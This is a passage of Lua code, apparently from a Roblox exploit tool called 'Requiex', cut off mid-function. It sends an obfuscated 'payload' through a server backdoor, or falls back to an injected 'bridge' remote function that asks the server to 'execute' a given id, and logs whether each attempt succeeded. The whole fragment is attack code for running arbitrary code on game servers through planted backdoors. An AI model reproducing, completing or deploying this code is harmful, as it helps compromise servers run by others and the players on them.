        local success = Requiex._execBackdoor(Obfuscate(id))
        
        if success then
            Requiex:Log("Payload SENT to Server", "SUCCESS")
        else
            Requiex:Log("Remote blocked request", "ERROR")
        end
    elseif Requiex.Injected then
        -- Логика для моста (Bridge)
        if Requiex.ServerFunction then
            local ok, result = pcall(function()
                return Requiex.ServerFunction:InvokeServer("execute", id)
            end)
            if ok then
                Requiex:Log("Bridge execute sent", "INFO")
            else
                Requiex:Log("Bridge call failed: "..tostring(result), "ERROR")
            end
        else
            Requiex:Log("Bridge not available", "ERROR")
        end
